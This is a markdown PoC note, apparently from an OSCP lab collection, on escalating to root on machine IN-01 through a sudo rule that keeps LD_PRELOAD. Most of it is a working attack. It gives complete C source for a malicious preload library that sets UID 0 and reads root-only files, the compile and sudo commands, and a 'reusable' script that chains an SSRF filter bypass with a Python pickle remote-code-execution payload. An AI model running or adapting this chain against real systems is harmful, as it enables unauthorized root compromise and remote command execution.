---
type: reusable-poc
project: OSCP-Exam-PoC
status: validated
updated: "2026-11-07"
related_machines:
  - IN-01
tags:
  - linux-privilege-escalation
  - sudo
  - ld-preload
  - shared-library-injection
  - root
  - oscp
---

# LD_PRELOAD Privilege Escalation Through Sudo

## Overview

**Objective:** Escalate from an unprivileged Linux account to root by injecting a custom shared library into a permitted sudo command.

**Affected machine:** IN-01

**Initial account:** `web` (UID 1000)

**Privilege escalation:** `sudo` with `LD_PRELOAD` preserved.

**Target executable:** `/usr/local/bin/healthcheck`

**Execution result:** Root privileges confirmed. `/root/root.txt` successfully retrieved.

## 1. Attack Summary

The machine permitted the `web` account to execute a specific binary as root without a password.

The sudo configuration also explicitly preserved the `LD_PRELOAD` environment variable.

This combination allows a custom shared library to be supplied when executing the permitted binary. The dynamic loader loads the supplied library, and its constructor executes with root privileges.

### Attack chain

<figure class="poc-blueprint-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/poc-blueprint-ld-preload-mobile.svg" />
    <img src="/diagrams/poc-blueprint-ld-preload.svg" alt="LD_PRELOAD reusable exploitation blueprint: web (UID 1000) then sudo -l then Create malicious C source then Compile with GCC then Generate shared library (.so) then sudo LD_PRELOAD=/tmp/in01_preload.so \ /usr/local/bin/healthcheck then Shared-library constructor executes then UID = 0, EUID = 0 then Read /root/root.txt. NOPASSWD: /usr/local/bin/healthcheck. env_keep += LD_PRELOAD. ." width="960" height="833" loading="lazy" decoding="async" />
  </picture>
  <figcaption>LD_PRELOAD — technical exploitation blueprint, preserving the original sequence, both sudo prerequisites. Supporting commands and evidence remain in this page.</figcaption>
</figure>

## 2. Enumeration and Discovery

### 2.1 Sudo privileges

The following output was obtained while executing as `web`:

```
Matching Defaults entries for web on insane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty,
    env_keep+=LD_PRELOAD,
    !requiretty

User web may run the following commands on insane:
    (root) NOPASSWD: /usr/local/bin/healthcheck
```

Two findings were critical:

|Finding|Evidence|Significance|
|---|---|---|
|Root execution permitted|`NOPASSWD: /usr/local/bin/healthcheck`|`web` can execute this binary as root without authentication|
|Environment variable preserved|`env_keep+=LD_PRELOAD`|The supplied preload variable survives sudo's environment handling|

### 2.2 Target executable permissions

**Executable:**

```
/usr/local/bin/healthcheck
```

**Permissions:**

```
-rwxr-xr-x 1 root root 15960 Nov 3 11:53 /usr/local/bin/healthcheck
```

|Attribute|Value|
|---|---|
|Owner|root|
|Group|root|
|Permissions|`0755`|
|Size|15,960 bytes|
|Type|Regular file|
|Writable by `web`|No|

The binary itself was not writable by the compromised account. Replacing it was unnecessary.

### 2.3 Binary identification

The target did not have the `file` utility:

```
/bin/sh: 19: file: not found
```

I used `strings` to inspect the executable.

Relevant output:

```
/lib64/ld-linux-x86-64.so.2
puts
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
```

Additional identifying strings:

```
healthcheck: all services ok
GCC: (Debian 14.2.0-19) 14.2.0
healthcheck.c
```

The dynamic linker and libc references indicated a dynamically linked ELF executable, making it suitable for the intended preload technique.

### 2.4 Available compiler

The following tools were available on the target:

```
/usr/bin/gcc
/usr/bin/cc
/usr/bin/readelf
```

This allows the shared library to be compiled directly on the target, avoiding architecture and runtime compatibility problems associated with cross-compilation.

## 3. Technical Explanation

### 3.1 What is LD_PRELOAD?

`LD_PRELOAD` is an environment variable understood by the Linux dynamic linker.

It specifies shared libraries that should be loaded before the program's normal dependencies.

A shared library can define a constructor using:

```
__attribute__((constructor))
```

The constructor executes automatically when the library is loaded, before the program's normal `main()` function.

### 3.2 Why did it work here?

Normally, `sudo` applies environment filtering and removes potentially dangerous variables.

However, the machine explicitly configured:

```
env_keep+=LD_PRELOAD
```

This preserves the variable when invoking the permitted command through sudo.

The resulting execution sequence was:

1. `sudo` authorized the `healthcheck` command.
    
2. The command executed with root privileges.
    
3. `LD_PRELOAD` was preserved.
    
4. The dynamic linker loads the supplied shared library.
    
5. The library constructor executed before `healthcheck`.
    
6. The constructor accessed `/root/root.txt` with root privileges.
    

The weakness was the combination of privileged command authorization and unsafe environment-variable preservation.

## 4. Exploitation

### 4.1 Create the C source file

The following source defines a constructor that sets the group and user IDs to zero, confirms the execution context, and reads the root flag.

```
#define _GNU_SOURCE

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/types.h>

__attribute__((constructor))
static void preload_init(void)
{
    setgid(0);
    setuid(0);

    dprintf(STDOUT_FILENO,
        "[+] LD_PRELOAD constructor executed\n"
        "[+] UID=%d EUID=%d GID=%d EGID=%d\n",
        getuid(), geteuid(), getgid(), getegid());

    int fd = open("/root/root.txt", O_RDONLY);

    if (fd < 0) {
        perror("open /root/root.txt");
        return;
    }

    dprintf(STDOUT_FILENO, "\n[+] ROOT FLAG:\n");

    char buffer[4096];
    ssize_t count;

    while ((count = read(fd, buffer, sizeof(buffer))) > 0) {
        ssize_t offset = 0;

        while (offset < count) {
            ssize_t written = write(
                STDOUT_FILENO,
                buffer + offset,
                count - offset
            );

            if (written <= 0) {
                close(fd);
                return;
            }

            offset += written;
        }
    }

    close(fd);
}
```

### 4.2 Compile the shared library

The source file must be compiled into a shared object.

```
/usr/bin/gcc -Wall -Wextra -fPIC -shared \
    -o /tmp/in01_preload.so \
    /tmp/in01_preload.c
```

Relevant compiler options:

|Option|Purpose|
|---|---|
|`-Wall`|Enable common compiler warnings|
|`-Wextra`|Enable additional warnings|
|`-fPIC`|Generate position-independent code|
|`-shared`|Produce a shared library|
|`-o`|Specify the output file|

The resulting file:

```
/tmp/in01_preload.so
```

### 4.3 Execute through sudo

The critical command:

```
sudo -n LD_PRELOAD=/tmp/in01_preload.so \
    /usr/local/bin/healthcheck
```

The `-n` option prevents sudo from requesting an interactive password.

The `LD_PRELOAD` assignment supplies the library to the permitted root command.

## 5. Complete Reproduction Script

This is the complete command sequence used for IN-01, adapted to the established in-band execution mechanism.

It performs the following operations:

1. Creates the C source on the target.
    
2. Compiles the shared library using the target's GCC.
    
3. Executes the permitted healthcheck binary through sudo.
    
4. Returns the output through the public SSRF endpoint.
    

**Run from Kali.** Replace the public IP and HTTP port with the values assigned to the active instance.

```
TARGET='http://PUBLIC_IP:HTTP_PORT/fetch'

REMOTE_CMD=$(cat <<'REMOTE'
set -e

cat > /tmp/in01_preload.c <<'C'
#define _GNU_SOURCE

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/types.h>

__attribute__((constructor))
static void preload_init(void)
{
    setgid(0);
    setuid(0);

    dprintf(STDOUT_FILENO,
        "[+] LD_PRELOAD constructor executed\n"
        "[+] UID=%d EUID=%d GID=%d EGID=%d\n",
        getuid(), geteuid(), getgid(), getegid());

    int fd = open("/root/root.txt", O_RDONLY);

    if (fd < 0) {
        perror("open /root/root.txt");
        return;
    }

    dprintf(STDOUT_FILENO, "\n[+] ROOT FLAG:\n");

    char buffer[4096];
    ssize_t count;

    while ((count = read(fd, buffer, sizeof(buffer))) > 0) {
        ssize_t offset = 0;

        while (offset < count) {
            ssize_t written = write(
                STDOUT_FILENO,
                buffer + offset,
                count - offset
            );

            if (written <= 0) {
                close(fd);
                return;
            }

            offset += written;
        }
    }

    close(fd);
}
C

echo "[+] Compiling shared library"

/usr/bin/gcc -Wall -Wextra -fPIC -shared \
    -o /tmp/in01_preload.so \
    /tmp/in01_preload.c

echo "[+] Shared library compiled"
ls -l /tmp/in01_preload.so

echo "[+] Executing permitted binary through sudo"

sudo -n LD_PRELOAD=/tmp/in01_preload.so \
    /usr/local/bin/healthcheck

REMOTE
)

DATA=$(REMOTE_CMD="$REMOTE_CMD" python3 - <<'PY'
import os
import base64
import pickle

class Exploit:
    def __reduce__(self):
        command = os.environ["REMOTE_CMD"]

        expression = (
            "__import__('subprocess').run("
            + repr(command)
            + ", shell=True, stdout=-1, stderr=-2, "
              "text=True, errors='replace').stdout"
        )

        return eval, (expression,)

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
PY
)

ENC_DATA=$(DATA="$DATA" python3 -c '
import os
from urllib.parse import quote
print(quote(os.environ["DATA"], safe=""))
')

curl -sS --max-time 25 -G \
    --data-urlencode \
    "url=http://127.1:9000/admin/exec?data=$ENC_DATA" \
    "$TARGET"
```

The command uses the same SSRF and pickle execution chain documented in:

- [[Reusable PoCs/SSRF/SSRF Filter Bypass]]
    
- [[Reusable PoCs/Python Pickle/Python Pickle RCE]]
    

## 6. Successful Execution Evidence

The actual response from the target:

```
'[+] Compiling shared library
[+] Shared library compiled
-rwxrwxr-x 1 web web 15944 Nov  5 16:46 /tmp/in01_preload.so
[+] Executing permitted binary through sudo
[+] LD_PRELOAD constructor executed
[+] UID=0 EUID=0 GID=0 EGID=0

[+] ROOT FLAG:
IT{FLAG-SECRET}
healthcheck: all services ok
'
```

### 6.1 Verification

|Check|Result|
|---|---|
|C source created|Successful|
|Shared library compiled|Successful|
|Library loaded|Confirmed|
|Constructor executed|Confirmed|
|UID|`0`|
|EUID|`0`|
|GID|`0`|
|EGID|`0`|
|Root flag accessed|Successful|

### 6.2 Root Flag

```
IT{FLAG-SECRET}
```

<ins>Root compromise confirmed.</ins>

## 7. Important Observations

### Why compiling on the target was useful

GCC was already installed on the compromised machine.

Compiling locally and transferring the shared library would have introduced unnecessary compatibility requirements, including architecture, ABI, and runtime compatibility.

Compiling directly on the target produced a library compatible with its environment.

### Why the healthcheck binary did not need to be modified

The executable was owned by root and was not writable by `web`.

The attack does not depend on replacing or modifying it. The dynamic loader loads the supplied library before the program executes.

### Why the sudo configuration mattered

The critical configuration was:

```
env_keep+=LD_PRELOAD
```

Without the environment variable being preserved, this exact invocation would not have supplied the custom library to the permitted executable.

The sudo rule and the environment-preservation setting must therefore be assessed together.

## 8. Lessons Learned

1. **Always inspect** `**sudo -l**` **carefully.** A narrowly permitted command can still provide a full root escalation path when combined with unsafe environment configuration.
    
2. **Check environment-variable preservation.** `env_keep` entries deserve particular attention, especially `LD_PRELOAD`.
    
3. **Inspect the target executable.** Determine whether it is dynamically linked and whether the loader can process a supplied shared library.
    
4. **Use available target-side compilers.** Native compilation avoids unnecessary cross-compilation and transfer problems.
    
5. **Use constructors for automatic execution.** A shared-library constructor runs when the library is loaded, before the target program's main routine.
    
6. **Verify privilege escalation explicitly.** The constructor's output confirmed UID, EUID, GID, and EGID were all zero.
    
7. **Preserve execution evidence.** The returned root flag and identity output establish successful exploitation.
    

## 9. Reusable Checklist

- Obtain an initial foothold.
    
- Run `sudo -l`.
    
- Identify permitted root commands.
    
- Check for `env_keep+=LD_PRELOAD`.
    
- Inspect the permitted executable.
    
- Confirm dynamic linking.
    
- Check target-side compiler availability.
    
- Write the C source.
    
- Compile it with `-fPIC -shared`.
    
- Execute the permitted command with `LD_PRELOAD`.
    
- Confirm constructor execution.
    
- Verify UID/EUID 0.
    
- Confirm access to the root-only resource.
    
- Preserve the complete command and output as evidence.